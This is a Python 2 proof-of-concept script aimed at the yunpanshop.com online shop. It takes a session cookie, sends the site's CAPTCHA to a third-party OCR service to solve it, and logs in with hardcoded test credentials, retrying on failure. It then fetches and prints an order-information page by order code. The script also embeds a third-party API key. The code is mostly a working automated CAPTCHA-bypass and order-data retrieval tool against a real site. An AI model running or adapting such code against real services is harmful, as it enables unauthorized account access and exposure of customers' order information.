#!/usr/bin/env python 
#check the yunpanshop poc
#joeyxy83@gmail.com
#20150618
#1.get the login.jsp,get the jsessionid
#2.get the checkcode jgep with jsessionid,then crack
#3.login.html
#4.get the order,get the order information.


import re
import time
import json
import urllib
import urllib2
import requests
import pytesseract
from PIL import Image
import httplib
from xml.etree import ElementTree
import sys
import time
from bs4 import BeautifulSoup

__version__ = '0.1'
# version for Python OcrKing Client #

# OcrKing Api Url #
#get api url:http://api.ocrking.com/server.html
__api_url__ = 'http://112.226.129.217:6080/ok.html'
#httplib.HTTPConnection._http_vsn = 10
#httplib.HTTPConnection._http_vsn_str = 'HTTP/1.0'

global cookie,checkCode

error = 0

def yp_start_login():
    api_url = 'http://www.yunpanshop.com/login.jsp'
    headers = {'User-Agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:36.0) Gecko/20100101 Firefox/36.0',}
    try:
        req = requests.get(api_url,headers=headers,timeout=3)
        req_status = req.status_code
        cookie = req.cookies['JSESSIONID']
    except requests.RequestException as e:
        print "start login error:%s" % e
        sys.exit(1)
    if req_status == 200:
        if error:
            print "get cookie:%s" % cookie
        return cookie

def yp_crack_captcha():
    pic_file = downloadImg()
    #print pic_file
    file = str(pic_file)+'.png'
    path = './pic/'+file
    key = 'def1e763f8ebc690cbubfgyKfTjB0MI1egCtrNt4hJNBlxyCRy1bptAc65x1VhI0dCcwTL'
    #print file,path
    image = open(path, "rb") 
    file = [('ocrfile',file,image.read())]

    fields = [('url','http://www.yunpanshop.com/checkCode.htm?id={0}'),('service', 'OcrKingForCaptcha'),('language','eng'),('charset','11'),('apiKey', key),('type','http://www.yunpanshop.com/checkCode.htm?id={0}')]

    xml = post_multipart(fields,file)
    read_xml(xml)
    #print xml

def yp_login():
    global checkCode
    api_url = 'http://www.yunpanshop.com/login.htm'
    headers = {'User-Agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:36.0) Gecko/20100101 Firefox/36.0',}
    cookies = {'JSESSIONID':cookie}
    data = {'pmid':'',
    'username':'jtest',
    'password':'jtest12',
    'checkCode':checkCode,
    }
    try:
        req = requests.post(api_url, data=data, headers=headers,cookies = cookies,timeout=3)
        result = req.text
        if error:
            print result
        pattern = re.compile(r'main.htm')
        num = re.findall(pattern, result)
        if len(num) > 0:
            print "login ok,checkCode:%s" % checkCode
            yp_query_order()
        else:
            print "login fail,try again,checkCode:%s" % checkCode
            time.sleep(3)
            yp_crack_captcha()

    except requests.RequestException as e:
        print "request login fail %s" % e
        sys.exit(1)


def yp_query_order():
    api_url = 'http://www.yunpanshop.com/order/orderInfo.htm?orderCode=6100'
    headers = {'User-Agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:36.0) Gecko/20100101 Firefox/36.0',}
    cookies = {'JSESSIONID':cookie}
    try:
        results = requests.get(api_url,headers=headers,cookies = cookies,verify=False, timeout=5)  
        if error:
            print results.text
        soup = BeautifulSoup(results.text)
        result = soup.find_all("table",class_="order-info-tab m-b15")
        print result[0].contents[1],result[0].contents[3],result[0].contents[5]
    except requests.RequestException as e:
        print "request login fail %s" % e
        sys.exit(1) 





def get_ocking_api_url():
    url = 'http://api.ocrking.com/server.html'
    global __api_url__
    try:
        results = requests.get(url,timeout=3)
        urls = results.text
        pattern = re.compile(r'\d+.\d+.\d+.\d+:\d+/ok.html')
        url=re.findall(pattern,urls)
        for i in range(len(url)):
            __api_url__="http://"+url[i]
            print __api_url__
    except requests.RequestException as e:
        print "cann't get ocking working api url.error:%s" % e
        sys.exit(1)

def downloadImg():
    if error:
        print cookie
    cookies = {'JSESSIONID':cookie}
    headers = {'User-Agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:36.0) Gecko/20100101 Firefox/36.0',}
    pic_file = int(time.time())
    pic_url = "http://www.yunpanshop.com/checkCode.htm?id={0}"
    if error:
        print '[+] Download Picture: {}'.format(pic_url)
    try:
        resp = requests.get(pic_url, headers=headers,cookies = cookies,verify=False, timeout=5)
    except:
        resp = requests.get(pic_url, headers=headers,cookies = cookies,verify=False, timeout=3)
    with open("./pic/%s.png"%pic_file, 'wb') as fp:
        fp.write(resp.content)
    return pic_file



def post_multipart(fields, files):
    content_type, body = encode_multipart(fields, files)
    httplib.HTTPConnection._http_vsn = 10  #must using the http 1.0
    httplib.HTTPConnection._http_vsn_str = 'HTTP/1.0'
    headers = {'Content-Type': content_type,
    'Content-Length': str(len(body)),
    'Accept-Encoding': 'gzip, deflate',
    'Referer': 'http://lab.ocrking.com/?pyclient' + __version__,
    'Accept':'*/*'}
    if error:
        print __api_url__
    r = urllib2.Request(__api_url__, body, headers)
    return urllib2.urlopen(r).read()

### format the data into multipart/form-data ###    
def encode_multipart(fields, files):
    LIMIT = '----------OcrKing_Client_Aven_s_Lab_L$'
    CRLF = '\r\n'
    L = []
    for (key, value) in fields:
        L.append('--' + LIMIT)
        L.append('Content-Disposition: form-data; name="%s"' % key)
        L.append('')
        L.append(value)
    for (key, filename, value) in files:
        L.append('--' + LIMIT)
        L.append('Content-Disposition: form-data; name="%s"; filename="%s"' % (key, filename))
        L.append('Content-Type: application/octet-stream' )
        L.append('')
        L.append(value)
    L.append('--' + LIMIT + '--')
    L.append('')
    body = CRLF.join(L)
    content_type = 'multipart/form-data; boundary=%s' % LIMIT
    return content_type, body

def print_node(node):
    global checkCode
    print "=====check captcha======"
    for key,value in node.items():
        print "%s:%s" % (key, value)
    for subnode in node.getchildren():
        if subnode.tag == 'Result':
            if error:
                print "%s:%s" % (subnode.tag, subnode.text)
            if type(subnode.text) == str and len(subnode.text) == 4:
                checkCode=int(subnode.text)
                if error:
                    print "checkCode is:%s" % checkCode
                yp_login()
            else:
                print "ocking check code error,try again"
                time.sleep(1)
                yp_crack_captcha()


        if subnode.tag == 'Status':
            if error:
                print "%s:%s" % (subnode.tag, subnode.text)        
        #print "%s:%s" % (subnode.tag, subnode.text)
    

def read_xml(text = '', xmlfile = ''):
    root = ElementTree.fromstring(text)
    eitor = root.getiterator("Item")
    for e in eitor:
        print_node(e)





if __name__ == '__main__':
    #get_ocking_api_url()
    cookie=yp_start_login()
    yp_crack_captcha()

